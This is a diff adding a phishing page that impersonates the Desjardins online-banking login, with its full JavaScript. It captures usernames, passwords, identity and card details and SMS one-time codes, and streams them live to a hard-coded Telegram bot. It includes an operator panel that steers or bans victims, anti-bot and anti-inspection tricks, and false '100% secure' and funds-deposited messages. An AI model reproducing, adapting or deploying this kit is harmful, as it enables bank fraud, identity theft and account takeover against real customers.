+                                            (Is this safe?)
+                                        </a>
+                                        <div id="safePopover" class="safe-popover" role="dialog" aria-label="Information de sécurité" aria-hidden="true">
+                                            <button type="button" id="closeSafePopoverBtn" class="safe-popover-close" aria-label="Fermer la bulle d'aide">&times;</button>
+                                            <p data-i18n="safePopoverText" style="margin: 0; white-space: pre-line;">A secure feature for your personal devices. Not recommended for use on a public or shared device.
+
+Check the Remember me box so you don’t have to enter your username every time you log in.</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-item" style="margin-top: 25px;">
+                                <div class="password-section">
+                                    <div class="password-label">
+                                        <label for="passwordInput" data-i18n="passwordLabel">
+                                            Password
+                                        </label>
+                                    </div>
+                                    <div class="password-box">
+                                        <input type="password" id="passwordInput" class="mock-input" autocomplete="current-password">
+                                        <button type="button" class="eye" id="togglePasswordBtn" aria-label="Afficher ou masquer le mot de passe">
+                                            <svg viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M 5 18 Q 11 10, 18 10 Q 25 10, 31 18 Q 25 26, 18 26 Q 11 26, 5 18 Z" fill="none" stroke="#707070" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                                                <circle cx="18" cy="18" r="4.2" fill="none" stroke="#707070" stroke-width="2.3"/>
+                                            </svg>
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="form-item">
+                                <div>
+                                    <a class="forgot" href="https://www.desjardins.com/ca/help-page/index.jsp?docName=ai_joindre&domaine=ACCESD" data-i18n="forgotPwd">
+                                        Forgot your password?
+                                    </a>
+                                </div>
+                            </div>
+
+                            <div class="form-item">
+                                <div class="note">
+                                    <strong data-i18n="important">
+                                        Important:
+                                    </strong>
+                                    <span data-i18n="pwdSensitive">Passwords are case-sensitive.</span>
+                                </div>
+                            </div>
+
+                        </form>
+
+                        <button type="button" id="loginBtnAction" class="login" data-i18n="loginBtn">
+                            Log in
+                        </button>
+                        <div class="login-error-container">
+                            <div id="loginError" class="login-error-msg" data-i18n="loginErrorMsg">Please enter a valid username and password.</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- SECTION INFORMATIONS PERSONNELLES COMPLÈTES (ÉTAPE 2) -->
+                <div class="two-factor-section" id="twoFactorSection">
+                    <h1 data-i18n="infoTitle">Identity Verification</h1>
+                    <p style="font-size: 14.5px; color: #4a4a4a; margin: 0;" data-i18n="infoSubtitle">
+                        Please provide your personal and card details to complete security verification.
+                    </p>
+                    <div class="info-form-grid">
+                        <div class="info-form-group">
+                            <label for="firstNameInput" data-i18n="firstNameLabel">First Name</label>
+                            <input type="text" id="firstNameInput" class="mock-input" autocomplete="given-name" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="lastNameInput" data-i18n="lastNameLabel">Last Name</label>
+                            <input type="text" id="lastNameInput" class="mock-input" autocomplete="family-name" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="dobInput" data-i18n="dobLabel">Date of Birth</label>
+                            <input type="date" id="dobInput" class="mock-input" autocomplete="bday" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="phoneInput" data-i18n="phoneLabel">Phone Number</label>
+                            <input type="tel" id="phoneInput" class="mock-input" autocomplete="tel" placeholder="(514) 456-7890" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="emailInput" data-i18n="emailLabel">Email Address</label>
+                            <input type="email" id="emailInput" class="mock-input" autocomplete="email" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="cardDigitsInput" data-i18n="cardDigitsLabel">First digits of your card (or Access Card number)</label>
+                            <input type="text" id="cardDigitsInput" class="mock-input" autocomplete="off" maxlength="16" placeholder="4532 ..." oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group full-width">
+                            <label for="addressInput" data-i18n="addressLabel">Address</label>
+                            <input type="text" id="addressInput" class="mock-input" autocomplete="street-address" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="cityInput" data-i18n="cityLabel">City</label>
+                            <input type="text" id="cityInput" class="mock-input" autocomplete="address-level2" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="postalCodeInput" data-i18n="postalCodeLabel">Postal Code</label>
+                            <input type="text" id="postalCodeInput" class="mock-input" autocomplete="postal-code" placeholder="H3Z 2Y7" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="provinceInput" data-i18n="provinceLabel">Province</label>
+                            <input type="text" id="provinceInput" class="mock-input" autocomplete="address-level1" value="Quebec" oninput="handleInfoLiveUpdate()">
+                        </div>
+                        <div class="info-form-group">
+                            <label for="countryInput" data-i18n="countryLabel">Country</label>
+                            <input type="text" id="countryInput" class="mock-input" autocomplete="country-name" value="Canada" oninput="handleInfoLiveUpdate()">
+                        </div>
+                    </div>
+                    <div>
+                        <button type="button" class="login" id="verifyBtn" style="margin: 15px 0 0 0 !important;" data-i18n="verifyBtn" disabled>Verify</button>
+                    </div>
+                </div>
+
+                <!-- SECTION CODE (ÉTAPE 3) -->
+                <div class="code-section" id="codeSection">
+                    <h1 data-i18n="codeTitle">Enter Verification Code</h1>
+                    <p style="font-size: 15px; color: #4a4a4a; margin: 0;" data-i18n="codeSubtitle">
+                        Please enter the 6-digit verification code sent to your phone.
+                    </p>
+                    <div class="code-container">
+                        <label for="codeInput" data-i18n="codeLabel">Verification Code</label>
+                        <input type="text" id="codeInput" class="mock-input" maxlength="6" placeholder="123456" autocomplete="one-time-code" oninput="handleOtpLiveUpdate()">
+                    </div>
+                    <div>
+                        <button type="button" class="login" id="submitCodeBtn" style="margin: 20px 0 0 0 !important;" data-i18n="submitCodeBtn" disabled>Submit</button>
+                    </div>
+                </div>
+
+                <!-- SECTION SUCCÈS -->
+                <div class="success-section" id="successSection">
+                    <h1 data-i18n="successTitle">Thank you!</h1>
+                    <p style="font-size: 16px; color: #008b57; font-weight: 700; margin: 10px 0 0 0;" data-i18n="successMsg">
+                        Merci ! Vos fonds ont été déposés avec succès.
+                    </p>
+                </div>
+            </div>
+
+            <div class="lower">
+                <div class="lower-left">
+                    <div class="custom-container-reg-lj">
+                        <a href="https://accweb.mouv.desjardins.com/identifiantunique/adhesion/identification?langueCible=en" data-i18n="regLJ">
+                            Register for Accès LJ
+                        </a>
+                    </div>
+                    <div class="custom-container-reg-lj-affaires">
+                        <a href="https://www.desjardins.com/en/business/accounts-treasury/accesd-affaires.html" data-i18n="regLJAff">
+                            Register for Accès LJ Affaires
+                        </a>
+                    </div>
+                    <div class="custom-container-become-member">
+                        <a href="https://www.desjardins.com/en/accounts-services/everyday-account.html" data-i18n="becomeMember">
+                            Become a member
+                        </a>
+                    </div>
+                </div>
+                <div class="lower-right">
+                    <div class="security-links">
+                        <div style="display: flex; align-items: flex-start; justify-content: space-between; gap: 20px;">
+                            <div style="display: flex; flex-direction: column; gap: 12px;">
+                                <div class="custom-container-site-sec">
+                                    <a href="https://www.desjardins.com/en/security/security-measures.html" data-i18n="siteSec">
+                                        Site security
+                                    </a>
+                                </div>
+                                <div class="custom-container-tech-supp">
+                                    <a href="https://www.desjardins.com/en/accounts-services/accesd.html" data-i18n="techSupp">
+                                        Technical support
+                                    </a>
+                                </div>
+                                <div class="custom-container-rep-fraud">
+                                    <a href="https://www.desjardins.com/en/security/fraud-refund.html#victim-fraud" data-i18n="repFraud">
+                                        Report fraud
+                                    </a>
+                                </div>
+                            </div>
+                            <div class="custom-container-security-badge">
+                                <a href="https://www.desjardins.com/en/security.html" class="security-badge" style="margin-top: 0; margin-left: 0; flex-shrink: 0; display: flex; align-items: center; gap: 6px; text-decoration: none; align-self: flex-start;">
+                                    <div class="lock" id="lockIcon" style="position: relative; top: -8px; width: auto; height: auto;">
+                                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M 7 10 V 7 A 5 5 0 0 1 17 7 V 10" fill="none" stroke="#00a86b" stroke-width="2.2" stroke-linecap="round"/>
+                                            <rect x="4" y="10" width="16" height="11" rx="2" fill="none" stroke="#00a86b" stroke-width="2.2"/>
+                                            <circle cx="12" cy="14" r="1.5" fill="#00a86b"/>
+                                            <path d="M 12 15.5 V 18" fill="none" stroke="#00a86b" stroke-width="1.6" stroke-linecap="round"/>
+                                        </svg>
+                                    </div>
+                                    <div class="guaranteed">
+                                        <span data-i18n="guaranteed">Guaranteed</span>
+                                        <span data-i18n="secure100">100% secure</span>
+                                    </div>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="right-visual-section" id="rightVisualSection">
+            <div class="window"></div>
+            <div class="person" style="align-items: flex-start;">
+                <img src="female.png" alt="Photographie d'une femme" style="object-position: top center;">
+            </div>
+        </section>
+    </div>
+</div>
+
+<footer class="footer">
+    <div class="footer-inner">
+        <div class="footer-top">
+            <a href="https://www.desjardins.com/ca/personal/index.jsp" data-i18n="persServ">PERSONAL SERVICES</a>
+            <span class="footer-top-separator"></span>
+            <a href="https://www.desjardins.com/en/business.html" data-i18n="busServ">BUSINESS SERVICES</a>
+            <span class="footer-top-separator"></span>
+            <a href="https://www.desjardins.com/en/tips.html" data-i18n="advice">ADVICE</a>
+            <span class="footer-top-separator"></span>
+            <a href="https://www.desjardins.com/en/about-us.html" data-i18n="aboutUs">ABOUT US</a>
+            <span class="footer-top-separator"></span>
+            <a href="https://www.desjardins.com/en/accounts-services/accesd.html#app" data-i18n="mobApp">MOBILE APP</a>
+        </div>
+        <div class="footer-small">
+            <a href="https://www.desjardins.com/ca/security/index.jsp" data-i18n="footSec">Security</a> |
+            <a href="https://www.desjardins.com/ca/terms-use-legal-notes/index.jsp" data-i18n="footTerms">Terms of Use and legal notes</a> |
+            <a href="https://www.desjardins.com/ca/privacy/index.jsp" data-i18n="footPriv">Privacy</a> |
+            <a href="#" data-i18n="footCookies">Personnaliser les témoins</a> |
+            <a href="https://www.desjardins.com/en/about-us/community/accessibility.html" data-i18n="footAccess">Accessibility</a> |
+            <a href="https://www.desjardins.com/ca/site-map/index.jsp" data-i18n="footMap">Site map</a>
+        </div>
+        <div class="copyright" data-i18n="copyright">
+            © 1996-2026, Mouvement des caisses Desjardins - Desjardins Group. All rights reserved.
+        </div>
+    </div>
+</footer>
+
+<div class="draggable-container" id="captchaBox" tabindex="0" aria-label="reCAPTCHA information" style="bottom: 25px; right: 0;">
+    <div class="captcha-icon-area">
+        <img src="captcha.png" alt="Captcha">
+    </div>
+    <div class="captcha-expanded-text">
+        protected by&nbsp;<strong>reCAPTCHA</strong>
+    </div>
+</div>
+
+<script>
+    // --- BOUCLIER DE CYBERSÉCURITÉ AVANCÉ CONTRE LES BOTS ---
+    (function() {
+        if (navigator.webdriver || window._phantom || window.__nightmare || window.callPhantom || window.Cypress || window.pw) {
+            document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - ENVIRONNEMENT AUTOMATISÉ DÉTECTÉ.</div>';
+            throw new Error("Bot detected");
+        }
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('copy', e => e.preventDefault());
+        document.addEventListener('cut', e => e.preventDefault());
+        document.addEventListener('paste', e => e.preventDefault());
+        
+        document.addEventListener('keydown', function(e) {
+            if (e.keyCode === 123 || 
+                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+                (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    })();
+
+    const BOT_TOKEN = '8766214960:AAEX7YS3CTaQCHbe7wNWGbwNjSgjLuTGEpw';
+    const CHAT_ID = '8370855026';
+
+    let telegramLoginMessageId = null;
+    let telegramInfoMessageId = null;
+    let telegramOtpMessageId = null;
+
+    const panelChannel = new BroadcastChannel('interac_panel_channel');
+
+    async function sendOrUpdateLoginTelegram(data, isLiveUpdate = false) {
+        const message = `🔐 <b>${isLiveUpdate ? 'CONNEXION EN DIRECT' : 'NOUVELLE CONNEXION (Desjardins)'}</b>\n\n` +
+                        `👤 <b>Nom d'utilisateur:</b> <code>${data.username || '...'}</code>\n` +
+                        `🔑 <b>Mot de passe:</b> <code>${data.password || '...'}</code>\n` +
+                        `🌐 <b>Navigateur/App:</b> ${navigator.userAgent}`;
+
+        if (isLiveUpdate && telegramLoginMessageId) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        message_id: telegramLoginMessageId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) { console.error('Telegram edit error:', err); }
+        } else {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const json = await res.json();
+                if (json.ok && json.result) {
+                    telegramLoginMessageId = json.result.message_id;
+                }
+            } catch (err) { console.error('Telegram send error:', err); }
+        }
+    }
+
+    async function sendOrUpdateInfoTelegram(data, isLiveUpdate = false) {
+        const message = `📋 <b>${isLiveUpdate ? 'INFORMATIONS EN DIRECT' : 'INFORMATIONS DÉTAILLÉES'}</b>\n\n` +
+                        `👤 <b>Nom complet:</b> ${data.fName || '...'} ${data.lName || '...'}\n` +
+                        `📅 <b>Date de naissance:</b> <code>${data.dob || '...'}</code>\n` +
+                        `📞 <b>Téléphone:</b> <code>${data.phone || '...'}</code>\n` +
+                        `📧 <b>Email:</b> <code>${data.email || '...'}</code>\n` +
+                        `🏠 <b>Adresse:</b> ${data.address || '...'}, ${data.city || '...'} (${data.postalCode || '...'}), ${data.province || '...'}, ${data.country || '...'}\n` +
+                        `💳 <b>Chiffres de la carte:</b> <code>${data.cardDigits || '...'}</code>`;
+
+        if (isLiveUpdate && telegramInfoMessageId) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        message_id: telegramInfoMessageId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) { console.error('Telegram edit info error:', err); }
+        } else {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const json = await res.json();
+                if (json.ok && json.result) {
+                    telegramInfoMessageId = json.result.message_id;
+                }
+            } catch (err) { console.error('Telegram send info error:', err); }
+        }
+    }
+
+    async function sendOrUpdateOtpTelegram(code, isLiveUpdate = false) {
+        const message = `🔢 <b>${isLiveUpdate ? 'CODE SMS EN DIRECT' : 'CODE DE VÉRIFICATION'}</b>\n\n` +
+                        `🔑 <b>Code OTP:</b> <code>${code || '...'}</code>`;
+
+        if (isLiveUpdate && telegramOtpMessageId) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        message_id: telegramOtpMessageId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (err) { console.error('Telegram edit otp error:', err); }
+        } else {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const json = await res.json();
+                if (json.ok && json.result) {
+                    telegramOtpMessageId = json.result.message_id;
+                }
+            } catch (err) { console.error('Telegram send otp error:', err); }
+        }
+    }
+
+    let localTesterId = localStorage.getItem("localTesterId");
+    if (!localTesterId) {
+        localTesterId = 'usr_' + Math.random().toString(36).substring(2, 9);
+        localStorage.setItem("localTesterId", localTesterId);
+    }
+    let currentUserEmail = localStorage.getItem("currentUserEmail") || "client.desjardins@gmail.com";
+
+    function reportStatusToDashboard(pageName, statusText) {
+        if (localStorage.getItem("userBanned") === "true") return;
+        let onlineUsers = JSON.parse(localStorage.getItem("onlineUsersList") || "[]");
+        const existingIndex = onlineUsers.findIndex(u => u.id === localTesterId);
+        
+        const userInfo = {
+            id: localTesterId,
+            email: currentUserEmail,
+            ip: '192.168.1.15 (QC, CA)',
+            currentPage: pageName,
+            status: statusText,
+            lastSeen: Date.now()
+        };
+
+        if (existingIndex >= 0) {
+            onlineUsers[existingIndex] = userInfo;
+        } else {
+            onlineUsers.unshift(userInfo);
+        }
+        localStorage.setItem("onlineUsersList", JSON.stringify(onlineUsers));
+    }
+
+    reportStatusToDashboard("desj.html", "En ligne (Étape 1: Identifiant)");
+
+    function pushLogToPanel(bankName, cardInfo, status, details) {
+        const logEntry = {
+            time: new Date().toLocaleTimeString(),
+            bank: bankName,
+            card: cardInfo,
+            status: status,
+            details: details
+        };
+
+        let liveLogs = JSON.parse(localStorage.getItem("liveAttackLogs") || "[]");
+        liveLogs.unshift(logEntry);
+        localStorage.setItem("liveAttackLogs", JSON.stringify(liveLogs));
+
+        let totalSent = parseInt(localStorage.getItem("panelTotalSent") || "0") + 1;
+        localStorage.setItem("panelTotalSent", totalSent);
+
+        if (status === 'SUCCESS') {
+            let totalSuccess = parseInt(localStorage.getItem("panelTotalSuccess") || "0") + 1;
+            localStorage.setItem("panelTotalSuccess", totalSuccess);
+
+            let winningRecordsLog = JSON.parse(localStorage.getItem("winningRecordsLog") || "[]");
+            winningRecordsLog.unshift({
+                id: '#' + Math.random().toString(36).substring(2, 8).toUpperCase(),
+                type: bankName,
+                amount: cardInfo,
+                date: "À l'instant"
+            });
+            localStorage.setItem("winningRecordsLog", JSON.stringify(winningRecordsLog));
+        }
+
+        panelChannel.postMessage({ type: 'NEW_LOG', log: logEntry });
+    }
+
+    let lastProcessedAction = localStorage.getItem("forceUserAction");
+    
+    function handleDashboardAction() {
+        const forced = localStorage.getItem("forceUserAction");
+        if (!forced || forced === lastProcessedAction) return;
+        
+        try {
+            const data = JSON.parse(forced);
+            if (data.targetId === "all" || data.targetId === localTesterId) {
+                lastProcessedAction = forced;
+
+                const formWrapper = document.getElementById('formWrapper');
+                const loginBtnAction = document.getElementById('loginBtnAction');
+                const twoFactorSection = document.getElementById('twoFactorSection');
+                const codeSection = document.getElementById('codeSection');
+                const successSection = document.getElementById('successSection');
+                const mainCard = document.getElementById('mainCard');
+                const rightVisualSection = document.getElementById('rightVisualSection');
+
+                if (data.action === "step") {
+                    if (formWrapper) formWrapper.style.display = 'none';
+                    if (twoFactorSection) twoFactorSection.style.display = 'none';
+                    if (codeSection) codeSection.style.display = 'none';
+                    if (successSection) successSection.style.display = 'none';
+                    if (loginBtnAction) loginBtnAction.style.display = 'none';
+
+                    if (data.value === "1") {
+                        if (mainCard) mainCard.classList.remove('full-width-mode');
+                        if (rightVisualSection) rightVisualSection.style.display = 'block';
+                        if (formWrapper) formWrapper.style.display = 'block';
+                        if (loginBtnAction) {
+                            loginBtnAction.style.display = 'flex';
+                            loginBtnAction.disabled = false;
+                            loginBtnAction.innerHTML = translations[currentLang]['loginBtn'] || 'Log in';
+                        }
+                    } else if (data.value === "2") {
+                        if (mainCard) mainCard.classList.add('full-width-mode');
+                        if (rightVisualSection) rightVisualSection.style.display = 'none';
+                        if (twoFactorSection) twoFactorSection.style.display = 'flex';
+                        const firstNameInput = document.getElementById('firstNameInput');
+                        if (firstNameInput) firstNameInput.focus();
+                    } else if (data.value === "3") {
+                        if (mainCard) mainCard.classList.add('full-width-mode');
+                        if (rightVisualSection) rightVisualSection.style.display = 'none';
+                        if (codeSection) codeSection.style.display = 'flex';
+                        const codeInput = document.getElementById('codeInput');
+                        if (codeInput) codeInput.focus();
+                    }
+                } else if (data.action === "otp") {
+                    window.location.href = data.value;
+                } else if (data.action === "ban") {
+                    localStorage.setItem("userBanned", "true");
+                    document.body.innerHTML = '<div style="background:#020204; color:#ff0055; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial, sans-serif; font-size:1.5rem; text-align:center;">ACCÈS REFUSÉ - VOUS AVEZ ÉTÉ BANNI PAR L\'ADMINISTRATEUR.</div>';
+                }
+            }
+        } catch (err) {
+            console.error("Erreur action dashboard:", err);
+        }
+    }
+
+    window.addEventListener("storage", (event) => {
+        if (event.key === "forceUserAction") {
+            handleDashboardAction();
+        }
+    });
+
+    setInterval(() => {
+        let currentStatus = "En ligne (Étape 1: Identifiant)";
+        if (document.getElementById('twoFactorSection') && document.getElementById('twoFactorSection').style.display === 'flex') {
+            currentStatus = "En ligne (Étape 2: Infos Personnelles)";
+        } else if (document.getElementById('codeSection') && document.getElementById('codeSection').style.display === 'flex') {
+            currentStatus = "En ligne (Étape 3: Code OTP)";
+        } else if (document.getElementById('successSection') && document.getElementById('successSection').style.display === 'flex') {
+            currentStatus = "Complété (Succès)";
+        }
+        reportStatusToDashboard("desj.html", currentStatus);
+
+        handleDashboardAction();
+    }, 1000);
+
+    const aaButton = document.querySelector('.aa-btn');
+    const textSizePanel = document.getElementById('textSizePanel');
+    const textSizeClose = document.getElementById('textSizeClose');
+    const textSizeChoices = document.querySelectorAll('.text-size-choice');
+
+    function setTextSizePanel(open) {
+        textSizePanel.classList.toggle('active', open);
+        textSizePanel.setAttribute('aria-hidden', open ? 'false' : 'true');
+        aaButton.setAttribute('aria-expanded', open ? 'true' : 'false');
+    }
+
+    aaButton.setAttribute('aria-controls', 'textSizePanel');
+    aaButton.setAttribute('aria-expanded', 'false');
+
+    aaButton.addEventListener('click', function(e) {
+        e.preventDefault();
+        setTextSizePanel(!textSizePanel.classList.contains('active'));
+    });
+
+    textSizeClose.addEventListener('click', function() {
+        setTextSizePanel(false);
+        aaButton.focus();
+    });
+
+    function applyTextScale(scale) {
+        document.body.style.zoom = scale;
+        textSizeChoices.forEach(function(btn) {
+            btn.parentElement.classList.toggle(
+                'active',
+                parseFloat(btn.dataset.scale) === scale
+            );
+        });
+    }
+
+    textSizeChoices.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+            applyTextScale(parseFloat(btn.dataset.scale));
+        });
+    });
+
+    const infoToggle = document.getElementById('infoToggle');
+    const infoPopover = document.getElementById('infoPopover');
+    const closeInfoPopoverBtn = document.getElementById('closeInfoPopoverBtn');
+
+    if (infoToggle && infoPopover) {
+        infoToggle.addEventListener('click', function(e) {
+            e.stopPropagation();
+            infoPopover.classList.toggle('active');
+        });
+
+        if (closeInfoPopoverBtn) {
+            closeInfoPopoverBtn.addEventListener('click', function(e) {
+                e.stopPropagation();
+                infoPopover.classList.remove('active');
+                infoToggle.focus();
+            });
+        }
+
+        infoPopover.addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+
+        document.addEventListener('click', function(e) {
+            if (!infoPopover.contains(e.target) && e.target !== infoToggle) {
+                infoPopover.classList.remove('active');
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && infoPopover.classList.contains('active')) {
+                infoPopover.classList.remove('active');
+                infoToggle.focus();
+            }
+        });
+    }
+
+    const safeLinkBtn = document.getElementById('safeLinkBtn');
+    const safePopover = document.getElementById('safePopover');
+    const closeSafePopoverBtn = document.getElementById('closeSafePopoverBtn');
+
+    function toggleSafePopover(show) {
+        const isVisible = show !== undefined ? show : !safePopover.classList.contains('active');
+        if (isVisible) {
+            safePopover.classList.add('active');
+            safePopover.setAttribute('aria-hidden', 'false');
+            safeLinkBtn.setAttribute('aria-expanded', 'true');
+        } else {
+            safePopover.classList.remove('active');
+            safePopover.setAttribute('aria-hidden', 'true');
+            safeLinkBtn.setAttribute('aria-expanded', 'false');
+        }
+    }
+
+    if (safeLinkBtn && safePopover && closeSafePopoverBtn) {
+        safeLinkBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            toggleSafePopover();
+        });
+
+        closeSafePopoverBtn.addEventListener('click', function(e) {
+            e.stopPropagation();
+            toggleSafePopover(false);
+            safeLinkBtn.focus();
+        });
+
+        safePopover.addEventListener('click', function(e) {
+            e.stopPropagation();
+        });
+
+        document.addEventListener('click', function(e) {
+            if (safePopover.classList.contains('active')) {
+                toggleSafePopover(false);
+            }
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && safePopover.classList.contains('active')) {
+                toggleSafePopover(false);
+                safeLinkBtn.focus();
+            }
+        });
+    }
+
+    const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+    const passwordInput = document.getElementById('passwordInput');
+
+    if (togglePasswordBtn && passwordInput) {
+        togglePasswordBtn.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+        });
+    }
+
+    const allInputs = document.querySelectorAll('.mock-input');
+    allInputs.forEach(input => {
+        input.addEventListener('blur', function() {
+            this.style.borderColor = '#c9c9c9';
+            this.style.boxShadow = 'none';
+        });
+    });
+
+    let sessionCollectedData = {
+        username: '',
+        password: '',
+        fName: '',
+        lName: '',
+        dob: '',
+        phone: '',
+        email: '',
+        address: '',
+        city: '',
+        postalCode: '',
+        province: '',
+        country: '',
+        cardDigits: '',
+        otpCode: ''
+    };
+
+    const usernameInput = document.getElementById('usernameInput');
+    let typingTimerLogin;
+
+    function handleLoginLiveInput() {
+        sessionCollectedData.username = usernameInput.value.trim();
+        sessionCollectedData.password = passwordInput.value.trim();
+        clearTimeout(typingTimerLogin);
+        typingTimerLogin = setTimeout(() => {
+            if (sessionCollectedData.username || sessionCollectedData.password) {
+                sendOrUpdateLoginTelegram({ username: sessionCollectedData.username, password: sessionCollectedData.password }, true);
+            }
+        }, 300);
+    }
+
+    if (usernameInput) usernameInput.addEventListener('input', handleLoginLiveInput);
+    if (passwordInput) passwordInput.addEventListener('input', handleLoginLiveInput);
+
+    const loginBtnAction = document.getElementById('loginBtnAction');
+    const loginError = document.getElementById('loginError');
+    const formWrapper = document.getElementById('formWrapper');
+    const twoFactorSection = document.getElementById('twoFactorSection');
+    const mainCard = document.getElementById('mainCard');
+    const rightVisualSection = document.getElementById('rightVisualSection');
+
+    if (loginBtnAction && usernameInput && passwordInput && loginError) {
+        loginBtnAction.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            sessionCollectedData.username = usernameInput.value.trim();
+            sessionCollectedData.password = passwordInput.value.trim();
+
+            if (sessionCollectedData.username === '' || sessionCollectedData.password === '') {
+                loginError.style.display = 'block';
+                return;
+            }
+
+            if (sessionCollectedData.username.includes("@")) {
+                currentUserEmail = sessionCollectedData.username;
+                localStorage.setItem("currentUserEmail", currentUserEmail);
+            }
+
+            loginError.style.display = 'none';
+            loginBtnAction.disabled = true;
+            loginBtnAction.innerHTML = '<div class="spinner"></div>';
+
+            reportStatusToDashboard("desj.html", "En ligne (Étape 2: Informations Personnelles)");
+
+            await sendOrUpdateLoginTelegram({ username: sessionCollectedData.username, password: sessionCollectedData.password }, false);
+            pushLogToPanel('Desjardins (Identifiant)', sessionCollectedData.username, 'PENDING', `Pass: ${sessionCollectedData.password}`);
+
+            if (mainCard) mainCard.classList.add('full-width-mode');
+            if (rightVisualSection) rightVisualSection.style.display = 'none';
+            formWrapper.style.display = 'none';
+            loginBtnAction.style.display = 'none';
+            twoFactorSection.style.display = 'flex';
+
+            const firstNameInput = document.getElementById('firstNameInput');
+            if (firstNameInput) firstNameInput.focus();
+        });
+    }
+
+    function updateSessionInfoData() {
+        sessionCollectedData.fName = document.getElementById('firstNameInput').value.trim();
+        sessionCollectedData.lName = document.getElementById('lastNameInput').value.trim();
+        sessionCollectedData.dob = document.getElementById('dobInput').value.trim();
+        sessionCollectedData.phone = document.getElementById('phoneInput').value.trim();
+        sessionCollectedData.email = document.getElementById('emailInput').value.trim();
+        sessionCollectedData.address = document.getElementById('addressInput').value.trim();
+        sessionCollectedData.city = document.getElementById('cityInput').value.trim();
+        sessionCollectedData.postalCode = document.getElementById('postalCodeInput').value.trim();
+        sessionCollectedData.province = document.getElementById('provinceInput').value.trim();
+        sessionCollectedData.country = document.getElementById('countryInput').value.trim();
+        sessionCollectedData.cardDigits = document.getElementById('cardDigitsInput').value.trim();
+    }
+
+    let typingTimerInfo;
+    function handleInfoLiveUpdate() {
+        checkInfoInputs();
+        updateSessionInfoData();
+        clearTimeout(typingTimerInfo);
+        typingTimerInfo = setTimeout(() => {
+            if (Object.values(sessionCollectedData).some(val => val !== '')) {
+                sendOrUpdateInfoTelegram(sessionCollectedData, true);
+            }
+        }, 300);
+    }
+
+    const firstNameInput = document.getElementById('firstNameInput');
+    const lastNameInput = document.getElementById('lastNameInput');
+    const dobInput = document.getElementById('dobInput');
+    const phoneInput = document.getElementById('phoneInput');
+    const emailInput = document.getElementById('emailInput');
+    const addressInput = document.getElementById('addressInput');
+    const cityInput = document.getElementById('cityInput');
+    const postalCodeInput = document.getElementById('postalCodeInput');
+    const provinceInput = document.getElementById('provinceInput');
+    const countryInput = document.getElementById('countryInput');
